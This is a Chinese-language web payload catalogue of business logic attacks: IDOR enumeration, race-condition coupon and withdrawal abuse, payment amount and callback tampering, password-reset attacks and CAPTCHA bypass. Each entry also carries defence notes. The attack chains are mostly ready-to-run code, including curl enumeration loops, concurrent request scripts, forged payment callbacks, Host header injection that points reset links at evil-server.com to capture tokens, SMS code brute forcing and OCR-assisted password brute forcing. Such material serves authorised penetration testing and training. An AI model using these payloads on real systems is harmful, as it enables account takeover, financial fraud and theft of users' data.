# 业务逻辑漏洞

_5 条 web payload_

### IDOR越权访问  `biz-idor`
_不安全的直接对象引用(IDOR)，通过篡改请求参数中的对象ID越权访问他人数据。攻击者可遍历用户ID、订单号等参数获取未授权资源。_
子类：**越权漏洞** · tags: `IDOR` `越权` `业务逻辑` `OWASP` `A01`

**前置条件：**
- 目标存在基于ID的资源访问接口
- 已登录普通用户账号

**攻击链：**

**1. 识别可遍历参数**
> 识别API中使用数字/UUID作为资源标识符的端点
```
# 抓取请求中的ID参数
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 常见IDOR参数：user_id, order_id, file_id, invoice_id, account_id
```
**语法解析：**
- `/api/users/1001/profile` — RESTful资源路径，1001为可篡改的用户ID _path_
- `Authorization: Bearer` — 携带当前用户的JWT令牌 _header_
- `{TARGET}` — 目标主机 _variable_
- `{TOKEN}` — 认证令牌 _variable_

**2. 水平越权测试**
> 遍历用户ID参数，观察响应码和大小差异以确认越权
```
# 用A用户的Token访问B用户的数据
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```
**语法解析：**
- `seq 1000 1010` — 生成连续ID序列用于遍历 _command_
- `%{http_code}` — curl输出HTTP状态码 _format_
- `%{size_download}` — 输出响应体大小用于对比 _format_
- `-s -o /dev/null` — 静默模式，丢弃响应体 _parameter_

**3. 垂直越权测试**
> 尝试以低权限用户调用管理员API或修改自身角色
```
# 用普通用户Token访问管理员接口
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 尝试修改角色
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```
**语法解析：**
- `GET /api/admin/users` — 管理员专属接口 _path_
- `PUT` — HTTP修改请求方法 _method_
- `"role": "admin"` — 尝试修改用户角色为管理员 _json_
- `"is_admin": true` — 尝试开启管理员标志位 _json_

**4. 参数污染越权**
> 利用参数重复、JSON键覆盖和数组注入绕过IDOR防御
```
# 双参数污染
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON参数覆盖
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# 数组注入
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```
**语法解析：**
- `user_id=1001&user_id=1002` — HTTP参数污染(HPP)，同一参数出现两次 _technique_
- `"user_id": 1002` — JSON重复键覆盖前值 _json_
- `user_id[]` — 数组参数注入 _technique_

**WAF/EDR 绕过变体：**

**编码ID绕过**
> 通过编码、负数、溢出等方式绕过ID校验
```
# Base64编码ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex编码
/api/users/0x3E9
# 负数/溢出
/api/users/-1
/api/users/2147483647
```
**语法解析：**
- `MTAwMQ==` — 1001的Base64编码 _encoding_
- `0x3E9` — 1001的十六进制表示 _encoding_
- `-1` — 负数边界测试 _value_
- `2147483647` — INT32最大值溢出测试 _value_


**概述：** IDOR(Insecure Direct Object References)是OWASP Top 10中A01:2021-访问控制失效的核心漏洞类型。当应用程序使用用户可控的输入直接访问数据库对象(如通过user_id/order_id)而未验证当前用户是否有权限时，攻击者可遍历参数值来越权访问他人数据、修改他人信息甚至提升自身权限。

**漏洞原理：** IDOR漏洞的根本原因是后端缺少细粒度的权限校验。常见场景：(1)API直接使用URL路径或查询参数中的ID查询数据库；(2)后端仅验证用户是否登录但未验证资源归属；(3)使用可预测的自增ID而非UUID；(4)前端隐藏了入口但后端未做校验。影响范围可从泄露单个用户的个人信息到批量导出全库数据。

**利用方法：** 利用步骤：(1)登录两个不同权限的测试账号A和B；(2)抓取A账号的API请求，记录所有包含ID参数的接口；(3)将A的请求中的ID替换为B的ID，观察是否能访问B的数据；(4)自动化遍历连续ID，统计成功率；(5)测试垂直越权：用普通用户Token访问管理员API。工具推荐：Burp Suite Intruder/Autorize插件可自动化检测。

**防御措施：** 修复方案：(1)后端每个请求必须验证当前用户是否有权限访问所请求的资源(基于session中的user_id而非请求参数)；(2)使用UUID代替自增ID防止遍历；(3)实现RBAC或ABAC访问控制模型；(4)对敏感操作实施速率限制防止批量遍历；(5)使用Burp Autorize插件在开发阶段进行自动化IDOR检测。

---

### 竞态条件攻击  `biz-race-condition`
_利用服务端TOCTOU(Time-of-Check to Time-of-Use)漏洞，通过并发请求在检查与执行之间的时间窗口内多次触发同一操作，实现重复领券、重复提现、超额购买等业务逻辑突破。_
子类：**竞态条件** · tags: `竞态条件` `Race Condition` `TOCTOU` `并发` `业务逻辑`

**前置条件：**
- 目标存在余额/积分/优惠券等可量化资源操作
- Python/Turbo Intruder环境

**攻击链：**

**1. 识别竞态目标**
> 识别涉及资源扣减、限量操作的API端点
```
# 典型竞态场景：
# 1. 优惠券领取 POST /api/coupon/claim
# 2. 余额提现 POST /api/withdraw
# 3. 积分兑换 POST /api/points/exchange
# 4. 限量商品抢购 POST /api/order/create
# 5. 投票/点赞 POST /api/vote
```
**语法解析：**
- `POST /api/coupon/claim` — 优惠券领取——典型竞态目标 _path_
- `POST /api/withdraw` — 提现操作——余额竞态 _path_
- `TOCTOU` — 检查时间到使用时间的竞态窗口 _concept_

**2. Python并发测试脚本**
> 使用Python asyncio并发发送50个相同请求，检测是否能多次领取
```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```
**语法解析：**
- `asyncio.gather` — 并行等待所有协程完成 _function_
- `aiohttp.ClientSession` — 异步HTTP客户端 _function_
- `for _ in range(50)` — 创建50个并发请求 _keyword_
- `{TARGET}` — 目标地址 _variable_

**3. Burp Turbo Intruder测试**
> Burp Turbo Intruder的gate机制确保所有请求同时发出
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```
**语法解析：**
- `concurrentConnections=30` — 30个并发连接 _parameter_
- `pipeline=True` — 启用HTTP管线化提高并发性 _parameter_
- `gate="race1"` — 请求闸门——所有请求排队后同时释放 _technique_
- `engine.openGate` — 打开闸门，同时发送所有排队请求 _function_

**4. 验证竞态成功**
> 查询账户资源确认竞态条件是否成功利用
```
# 检查资源是否被多次消耗
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 预期：限领1张优惠券实际领到多张
# 检查余额变化
GET /api/user/balance HTTP/1.1
```
**语法解析：**
- `GET /api/user/coupons` — 查询用户优惠券列表 _path_
- `GET /api/user/balance` — 查询用户余额 _path_

**WAF/EDR 绕过变体：**

**HTTP/2单连接并发**
> HTTP/2多路复用在单TCP连接中发送多个并发请求，绕过基于连接数的限制
```
# HTTP/2 multiplexing同一连接并发
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```
**语法解析：**
- `--http2` — 强制使用HTTP/2协议 _parameter_
- `--parallel --parallel-max 50` — 并行请求最大50个 _parameter_
- `multiplexing` — HTTP/2多路复用特性 _concept_


**概述：** 竞态条件(Race Condition)是一种利用服务端在检查(Check)和执行(Use)之间存在时间窗口的漏洞。当多个并发请求同时到达时，服务端可能在扣减资源前多次通过检查，导致资源被重复消耗。这类漏洞常见于电商、金融、社交等涉及有限资源操作的场景中。

**漏洞原理：** 漏洞根因在于服务端未对关键业务操作实施原子性保证。典型的TOCTOU流程：(1)服务端检查用户是否已领券→通过；(2)在写入"已领取"记录之前，另一个请求也通过了检查；(3)两个请求都成功执行领券操作。数据库层面缺少行锁/乐观锁、应用层面缺少分布式锁/幂等键是主要原因。

**利用方法：** 利用方法：(1)使用Burp Turbo Intruder的gate机制或Python asyncio发送大量并发请求；(2)HTTP/2 multiplexing可在单连接中实现极高并发；(3)观察响应中成功次数是否超出预期限制；(4)重点测试优惠券领取、余额提现、积分兑换、限量抢购、验证码验证等场景。单包技术(Single Packet Attack)是2023年新出的高效竞态利用手法。

**防御措施：** 防御方案：(1)数据库层使用SELECT FOR UPDATE行锁或乐观锁(版本号机制)；(2)应用层使用Redis分布式锁(SETNX)确保原子性；(3)为每个操作生成幂等键(Idempotency Key)，重复请求返回相同结果；(4)使用消息队列串行化关键操作；(5)在事务中完成检查和执行，避免TOCTOU窗口。

---

### 支付逻辑篡改  `biz-payment-tamper`
_通过修改支付请求中的金额、数量、折扣等参数来操纵交易逻辑。常见于电商平台和在线支付系统中，可导致0元购、负价格、折扣叠加等严重业务风险。_
子类：**支付安全** · tags: `支付` `金额篡改` `业务逻辑` `0元购` `电商安全`

**前置条件：**
- 目标存在支付/下单功能
- 可拦截和修改HTTP请求

**攻击链：**

**1. 金额篡改测试**
> 修改订单请求中的价格字段，测试后端是否校验金额
```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# 原始请求
{"product_id": "P001", "quantity": 1, "price": 9900}

# 篡改为1分钱
{"product_id": "P001", "quantity": 1, "price": 1}

# 篡改为0元
{"product_id": "P001", "quantity": 1, "price": 0}

# 负数金额（退款到账）
{"product_id": "P001", "quantity": 1, "price": -100}
```
**语法解析：**
- `"price": 9900` — 原始金额9900分(99元) _json_
- `"price": 1` — 篡改为1分钱 _json_
- `"price": -100` — 负数金额可能导致余额增加 _json_

**2. 数量与运费篡改**
> 测试数量边界值、运费篡改和折扣溢出
```
# 数量为0或负数
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# 修改运费
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# 超大折扣
{"product_id": "P001", "quantity": 1, "discount": 9999}
```
**语法解析：**
- `"quantity": -1` — 负数量可能导致退款 _json_
- `"shipping_fee": -500` — 负运费抵扣总价 _json_
- `"discount": 9999` — 超额折扣使总价为负 _json_

**3. 优惠券叠加与替换**
> 测试优惠券是否可叠加使用或替换为高面额券
```
# 叠加使用多张优惠券
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# 替换高额优惠券ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# 修改优惠金额字段
{"product_id": "P001", "coupon_discount": 9900}
```
**语法解析：**
- `"coupons": [...]` — 数组传递多张优惠券尝试叠加 _json_
- `"coupon_discount": 9900` — 直接篡改优惠金额 _json_

**4. 支付回调篡改**
> 伪造支付平台回调通知，篡改支付状态和金额
```
# 模拟支付成功回调
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# 修改回调中的金额
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```
**语法解析：**
- `status=SUCCESS` — 伪造支付成功状态 _value_
- `amount=1` — 实际支付1分但订单金额为99元 _value_
- `sign=tampered_sign` — 尝试伪造签名（如签名校验缺失） _value_

**WAF/EDR 绕过变体：**

**科学计数法绕过**
> 利用科学计数法、浮点精度、类型混淆绕过金额校验
```
# 科学计数法
{"price": 1e-10}
# 浮点精度
{"price": 0.000000001}
# 字符串类型混淆
{"price": "0.01"}
# Unicode数字
{"price": "\uff10"}
```
**语法解析：**
- `1e-10` — 科学计数法表示极小金额 _encoding_
- `0.000000001` — 浮点精度下溢 _value_
- `"0.01"` — 字符串类型可能绕过数值校验 _technique_


**概述：** 支付逻辑漏洞是电商和金融系统中最严重的业务逻辑缺陷之一。攻击者通过拦截和修改客户端发送的支付请求参数（如价格、数量、运费、折扣），或伪造第三方支付平台的回调通知，可以实现0元购买、负价格获利、绕过支付等攻击。这类漏洞的经济损失通常是直接的。

**漏洞原理：** 根本原因包括：(1)前端计算价格后端未重新校验——信任客户端提交的金额；(2)未对数量、金额进行范围校验（负数、零、超大值）；(3)支付回调未验证签名或验签逻辑有缺陷；(4)优惠券系统未限制叠加使用；(5)订单金额与实际支付金额的一致性校验缺失。许多开发者错误地认为HTTPS加密可以防止篡改。

**利用方法：** 利用方法：(1)使用Burp Suite拦截下单请求，修改price/quantity/discount等字段；(2)测试边界值：0、负数、极大值、浮点数、科学计数法；(3)检查支付回调接口是否可直接访问和伪造；(4)测试优惠券ID替换和叠加；(5)检查订单状态机是否可跳过支付步骤直接到"已支付"。重点关注移动端API，往往校验更弱。

**防御措施：** 防御方案：(1)服务端必须根据商品ID重新查询价格计算总额，永远不信任客户端金额；(2)对所有数值参数做严格范围校验(>0且<MAX)；(3)支付回调必须验证签名且验证金额与订单匹配；(4)使用数据库事务保证优惠券的原子性扣减；(5)实施订单状态机严格校验，防止状态跳跃。

---

### 密码重置逻辑缺陷  `biz-password-reset`
_密码重置流程中的逻辑漏洞，包括重置令牌泄露、验证码爆破、响应操纵、Host头注入等攻击手法，可实现任意用户密码重置。_
子类：**认证缺陷** · tags: `密码重置` `认证绕过` `业务逻辑` `验证码` `Host注入`

**前置条件：**
- 目标存在密码重置/找回功能
- 可拦截HTTP请求

**攻击链：**

**1. Host头注入窃取重置链接**
> 修改Host头使重置邮件中的链接指向攻击者服务器，窃取重置token
```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# 受害者收到的重置链接变为：
# https://evil-server.com/reset?token=abc123
```
**语法解析：**
- `Host: evil-server.com` — 篡改Host头使重置链接指向攻击者 _header_
- `X-Forwarded-Host` — 备选注入头，反代可能信任此头 _header_
- `victim@target.com` — 目标用户的邮箱 _value_

**2. 验证码爆破**
> 暴力破解4-6位验证码，测试是否有频率限制
```
# 4位验证码爆破
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```
**语法解析：**
- `seq -w 0000 9999` — 生成0000-9999所有4位数 _command_
- `grep -q "success"` — 匹配成功响应 _command_
- `{TARGET}` — 目标地址 _variable_

**3. 响应操纵绕过**
> 拦截并修改服务端响应，前端可能仅依赖响应状态判断
```
# 原始失败响应
{"code": 400, "message": "验证码错误"}

# 拦截并修改为成功
{"code": 200, "message": "验证成功", "token": "reset_token_here"}

# 某些前端仅检查code字段就放行后续操作
```
**语法解析：**
- `"code": 200` — 将错误码修改为成功码 _json_
- `响应操纵` — 修改HTTP响应欺骗前端 _concept_

**4. 重置令牌弱随机性**
> 分析重置令牌的生成算法，检查是否基于可预测因素
```
# 收集多个重置令牌分析规律
token1: 1707811200_user1  (时间戳+用户名)
token2: 1707811260_user2

# 可预测的token生成
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# 使用已知信息构造重置token
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```
**语法解析：**
- `hashlib.md5` — MD5哈希——弱随机性token常用 _function_
- `timestamp_email` — 时间戳+邮箱——可预测的token因子 _concept_

**WAF/EDR 绕过变体：**

**多Host头绕过**
> 使用多种HTTP头注入方式尝试覆盖重置链接中的域名
```
# 双Host头
Host: target.com
Host: evil.com

# 绝对URL覆盖
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded系列
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```
**语法解析：**
- `双Host头` — 部分服务器取第二个Host值 _technique_
- `X-Forwarded-Host` — 反向代理信任的转发头 _header_


**概述：** 密码重置是Web应用最关键的认证流程之一。攻击者可通过多种手法利用重置流程中的逻辑缺陷：Host头注入窃取重置令牌、暴力破解短验证码、操纵HTTP响应欺骗前端、利用弱随机性预测重置令牌等。成功利用可实现任意用户账号接管(Account Takeover)。

**漏洞原理：** 常见缺陷：(1)重置邮件/短信使用Host头拼接链接URL而未硬编码域名；(2)验证码未设置过期时间和尝试次数限制(4位码仅1万种可能)；(3)前端使用响应中的code字段判断验证结果而非在后端session中记录状态；(4)重置令牌基于MD5(时间戳+邮箱)等可预测算法生成；(5)令牌未设置过期时间或单次使用限制。

**利用方法：** 攻击路径：(1)Host注入：Burp修改Host/X-Forwarded-Host为攻击者域名，触发重置流程后在攻击者服务器接收带token的请求；(2)验证码爆破：Burp Intruder配合Pitchfork模式遍历0000-9999；(3)响应操纵：Burp拦截失败响应修改为成功以欺骗前端；(4)令牌分析：收集多个token分析规律后构造目标用户的token。可组合使用多种手法。

**防御措施：** 防御措施：(1)重置链接硬编码应用域名，不从HTTP头获取；(2)验证码设置6位以上、5分钟过期、5次错误锁定；(3)关键状态变更(如验证通过)只在服务端session中记录，不依赖前端；(4)使用crypto.randomBytes(32)等CSPRNG生成令牌；(5)令牌单次使用后立即失效，设置15分钟过期。

---

### 验证码绕过技术  `biz-captcha-bypass`
_绕过图形验证码、短信验证码、滑动验证等人机验证机制的各种技术手法，包括响应泄露、复用攻击、OCR识别、逻辑缺陷利用等。_
子类：**验证码安全** · tags: `验证码` `CAPTCHA` `绕过` `短信验证码` `人机验证`

**前置条件：**
- 目标存在验证码保护的功能
- Python环境

**攻击链：**

**1. 验证码响应泄露**
> 检查响应body、header、cookie中是否泄露验证码明文或编码值
```
# 检查响应中是否包含验证码
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# 响应可能泄露
{"code": 200, "captcha": "8462", "message": "发送成功"}
# 或在响应头中
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```
**语法解析：**
- `"captcha": "8462"` — 响应body直接泄露验证码 _json_
- `X-Captcha-Code` — 自定义响应头泄露验证码 _header_
- `ODQ2Mg==` — 8462的Base64编码在Cookie中 _encoding_

**2. 验证码复用攻击**
> 验证码使用后未失效，同一验证码可反复使用
```
# 步骤1: 正常获取并输入正确验证码
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# 步骤2: 使用相同captcha_id和验证码反复尝试
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# 如果验证码未在使用后失效，可以一直复用
```
**语法解析：**
- `"captcha_id": "abc"` — 验证码会话ID _json_
- `复用攻击` — 同一验证码+ID组合反复使用 _concept_

**3. 删除验证码参数**
> 测试不传、空传、null传验证码参数时后端是否仍然校验
```
# 原始请求（包含验证码）
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# 删除验证码字段
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# 空值测试
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```
**语法解析：**
- `删除captcha字段` — 服务端可能跳过未传参数的校验 _technique_
- `"captcha": null` — null值可能绕过非空校验 _value_

**4. 万能验证码**
> 测试开发者遗留的万能验证码或调试后门
```
# 常见万能/调试验证码
0000
1111
1234
8888
9999
6666
000000
123456

# 测试接口调试后门
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```
**语法解析：**
- `0000/1234/8888` — 常见开发调试万能码 _value_
- `"debug": true` — 调试模式参数可能绕过验证 _json_

**WAF/EDR 绕过变体：**

**OCR自动识别图形验证码**
> 使用ddddocr库自动识别图形验证码集成到爆破流程
```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # 获取验证码图片
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# 集成到爆破脚本中
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```
**语法解析：**
- `ddddocr.DdddOcr` — 国产深度学习OCR库，识别率高 _function_
- `ocr.classification` — 图片分类识别验证码文字 _function_


**概述：** 验证码(CAPTCHA)是防御自动化攻击的核心机制，但实际部署中存在大量逻辑缺陷可被绕过。常见攻击手法包括：响应中泄露验证码明文、验证码使用后未失效可复用、删除参数绕过校验、万能调试码、OCR自动识别等。绕过验证码后可进一步实施暴力破解、批量注册、自动化刷量等攻击。

**漏洞原理：** 常见缺陷分析：(1)验证码通过API响应、Cookie、JS变量等渠道泄露给客户端；(2)验证码验证后未立即在服务端删除，同一码可多次使用；(3)后端将验证码校验作为可选项，不传参数则跳过；(4)开发环境遗留的万能码(如000000)未清理上线；(5)图形验证码复杂度不足被OCR轻易识别；(6)短信验证码过期时间过长(>5分钟)或尝试次数无限制。

**利用方法：** 实施步骤：(1)发送验证码请求后检查完整响应(包括Headers和Cookies)；(2)获取一次正确验证码后尝试重复提交；(3)删除请求中的captcha字段或置空测试；(4)尝试常见万能码0000/1234/8888；(5)若为图形验证码使用ddddocr或TrueCaptcha API自动识别；(6)综合以上方法集成到Burp Intruder或Python脚本中实现自动化绕过+爆破。

**防御措施：** 防御建议：(1)验证码只在服务端生成和校验，永远不通过任何渠道返回给客户端；(2)验证码一次使用后立即失效；(3)强制要求验证码参数存在且非空；(4)清除所有调试后门和万能码；(5)使用高复杂度验证码(如reCAPTCHA v3/hCaptcha)或行为验证(滑动、点选)；(6)短信验证码设置6位数、3分钟过期、5次错误锁定30分钟。

---
